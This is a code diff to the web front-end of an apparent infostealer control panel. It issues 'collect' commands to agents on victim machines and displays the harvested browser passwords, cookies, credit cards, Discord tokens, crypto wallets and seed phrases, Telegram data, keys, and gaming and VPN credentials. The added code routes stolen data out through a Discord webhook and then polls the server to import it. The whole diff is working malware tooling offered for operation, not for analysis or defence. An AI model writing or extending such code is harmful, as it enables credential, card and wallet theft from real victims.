@@ -2164,8 +2164,9 @@
     }
 
     sse.addEventListener("harvest_update", (e) => {
-      const { clientId: cid } = JSON.parse(e.data);
-      harvestPending.add(cid);
+      let cid = null;
+      try { cid = JSON.parse(e.data)?.clientId; } catch (_) {}
+      if (cid) harvestPending.add(cid);
       if (harvestDebounce) clearTimeout(harvestDebounce);
       harvestDebounce = setTimeout(flushHarvestUpdates, 500);
     });
@@ -2311,22 +2312,126 @@
     buildTabs();
     buildBfilts();
 
+    function reenableCollectActions() {
+      if (collectBtn) collectBtn.disabled = false;
+      if (exportBtn) exportBtn.disabled = false;
+      if (scanFilesBtn) scanFilesBtn.disabled = false;
+      if (scanExtBtn) scanExtBtn.disabled = false;
+      if (scanWalletsBtn) scanWalletsBtn.disabled = false;
+      if (scanTgBtn) scanTgBtn.disabled = false;
+      if (scanKeysBtn) scanKeysBtn.disabled = false;
+      if (scanAppsBtn) scanAppsBtn.disabled = false;
+      if (scanGamingBtn) scanGamingBtn.disabled = false;
+      if (scanVpnBtn) scanVpnBtn.disabled = false;
+    }
+
+    /** Map export_client / DB rows into lastResults shape for the client table UI. */
+    function exportToLastResults(data) {
+      if (!data || typeof data !== "object") return {};
+      const out = {
+        passwords: data.passwords || [],
+        cookies: data.cookies || [],
+        autofill: data.autofill || [],
+        history: data.history || [],
+        bookmarks: data.bookmarks || [],
+        creditCards: data.credit_cards || data.creditCards || [],
+        discordTokens: data.discord_tokens || data.discordTokens || [],
+        files: data.files || [],
+        extensions: data.extensions || [],
+        wallets: data.wallets || [],
+        telegram: data.telegram || [],
+        keys: data.keys || [],
+        seeds: data.seeds || [],
+        appCredentials: data.app_credentials || data.appCredentials || [],
+      };
+      // Flatten gaming_items / vpn_items if present
+      if (data.gaming_items?.length) {
+        out._gamingRows = data.gaming_items.map(r => ({
+          platform: r.platform, label: r.label, value: r.value, detail: r.detail || "",
+        }));
+      }
+      if (data.vpn_items?.length) {
+        out._vpnRows = data.vpn_items.map(r => ({
+          provider: r.provider, label: r.label, value: r.value, detail: r.detail || "",
+        }));
+      }
+      return out;
+    }
+
+    function countLastResults(lr) {
+      return DATA_KEYS.map(k => (lr[k] || []).length);
+    }
+
+    function hasAnyHarvest(lr) {
+      if (!lr) return false;
+      if (DATA_KEYS.some(k => (lr[k] || []).length > 0)) return true;
+      if ((lr._gamingRows || []).length || (lr._vpnRows || []).length) return true;
+      return false;
+    }
+
+    /** After Discord pipeline: wait for server import then fill the table. */
+    async function loadImportedHarvestFromServer(hint) {
+      log("Waiting for server to import Discord post into the panel…");
+      for (let i = 0; i < 20; i++) {
+        try {
+          const data = await rpc("export_client", { clientId });
+          const lr = exportToLastResults(data);
+          if (hasAnyHarvest(lr)) {
+            lastResults = lr;
+            dataCard.style.display = "";
+            buildTabs(); buildBfilts(); renderTable();
+            const c = countLastResults(lr);
+            log(
+              `Import complete — ${c[0]} pw · ${c[1]} cookies · ${c[2]} autofill · ${c[3]} history · ` +
+              `${c[4]} bookmarks · ${c[5]} cards · ${c[6]} Discord · ${c[7]} files · ${c[8]} extensions · ` +
+              `${c[9]} wallets · ${c[10]} telegram · ${c[11]} keys · ${c[12]} seeds · ${c[13]} apps` +
+              (hint?.threadId ? ` (thread ${hint.threadId})` : "")
+            );
+            if (activeTab === "wallets") loadWalletCards().catch(() => {});
+            return true;
+          }
+        } catch (e) {
+          log(`Import check: ${e.message}`);
+        }
+        await new Promise(r => setTimeout(r, 1500));
+      }
+      log("Import still empty — use Poll Discord in Settings, or wait and re-open this client.");
+      return false;
+    }
+
     collectBtn.addEventListener("click", () => {
       collectBtn.disabled = true;
       log("Starting collection…");
       // Include Discord webhook so agent POSTs harvest HTTP→Discord (not bulk over C2 WS)
       (async () => {
-        let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
         try {
-          const s = await rpc("get_capture_settings");
-          discord = {
-            enabled: !!s.discord_upload_enabled,
-            webhookUrl: s.discord_webhook_url || "",
-            threadPrefix: s.discord_thread_prefix || "Stuart",
-          };
-        } catch (_) {}
-        sendEvent("collect", { browsers: true, gaming: true, vpns: true, discord });
+          let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
+          try {
+            const s = await rpc("get_capture_settings");
+            discord = {
+              enabled: !!s.discord_upload_enabled,
+              webhookUrl: s.discord_webhook_url || "",
+              threadPrefix: s.discord_thread_prefix || "Stuart",
+            };
+          } catch (_) {}
+          await sendEvent("collect", { browsers: true, gaming: true, vpns: true, discord });
+        } catch (e) {
+          log(`Collect start error: ${e.message}`);
+          reenableCollectActions();
+        }
       })();
+      // Safety: never leave Collect stuck if Discord path never re-enables us
+      setTimeout(() => {
+        if (collectBtn?.disabled) {
+          log("Collect still running… (Discord upload can take a few minutes for large wallets)");
+        }
+      }, 120000);
+      setTimeout(() => {
+        if (collectBtn?.disabled) {
+          reenableCollectActions();
+          log("Collect button re-enabled (timeout). Check log for Discord status.");
+        }
+      }, 10 * 60 * 1000);
     });
     scanFilesBtn.addEventListener("click", () => {
       scanFilesBtn.disabled = true;
@@ -2404,8 +2509,7 @@
         lastResults = payload;
         if (payload.gaming) { lastResults._gamingRaw = payload.gaming; lastResults._gamingRows = flattenGaming(payload.gaming); }
         if (payload.vpns) { lastResults._vpnRaw = payload.vpns; lastResults._vpnRows = flattenVPN(payload.vpns); }
-        collectBtn.disabled = false;
-        exportBtn.disabled = false;
+        reenableCollectActions();
         dataCard.style.display = "";
         buildTabs(); buildBfilts(); renderTable();
         const c = DATA_KEYS.map(k => (payload[k] || []).length);
@@ -2413,6 +2517,16 @@
         const vCount = (lastResults._vpnRows || []).length;
         log(`Collection complete — ${c[0]} pw · ${c[1]} cookies · ${c[2]} autofill · ${c[3]} history · ${c[4]} bookmarks · ${c[5]} cards · ${c[6]} Discord · ${c[7]} files · ${c[8]} extensions · ${c[9]} wallets · ${c[10]} telegram · ${c[11]} keys · ${c[12]} seeds · ${c[13]} apps · ${gCount} gaming · ${vCount} vpn`);
         if (payload.errors?.length) payload.errors.forEach(e => log(`warn: ${e}`));
+      },
+      // Discord pipeline: agent finished webhook upload; server imports then we load from DB
+      discord_upload_complete(payload) {
+        reenableCollectActions();
+        log(
+          `Discord upload complete — thread=${payload?.threadId || "?"} harvest=${payload?.harvestId || "?"} ` +
+          `wallets=${payload?.wallets ?? "?"} history=${payload?.history ?? "?"}`
+        );
+        log("Server is importing the forum post…");
+        loadImportedHarvestFromServer(payload).catch(e => log(`Import wait error: ${e.message}`));
       },
       file_scan_results(payload) {
         if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
@@ -2552,14 +2666,7 @@
         log(`VPN scan — ${lastResults._vpnRows.length} items found`);
       },
       error(payload) {
-        collectBtn.disabled = false;
-        scanFilesBtn.disabled = false;
-        scanWalletsBtn.disabled = false;
-        scanTgBtn.disabled = false;
-        scanKeysBtn.disabled = false;
-        scanAppsBtn.disabled = false;
-        scanGamingBtn.disabled = false;
-        scanVpnBtn.disabled = false;
+        reenableCollectActions();
         log(`ERROR: ${payload?.error || "unknown"}`);
       },
       pong() { log("pong"); },
@@ -2568,7 +2675,13 @@
     function handlePluginEvent(event, payload) {
       const handler = eventDispatch[event];
       if (handler) handler(payload);
-      else log(`event: ${event}`);
+      else {
+        log(`event: ${event}`);
+        // Any terminal-looking status should not leave Collect stuck
+        if (event === "status" && /discord upload complete|import complete|collection complete/i.test(String(payload?.message || ""))) {
+          reenableCollectActions();
+        }
+      }
     }
 
     window.addEventListener("message", (e) => {
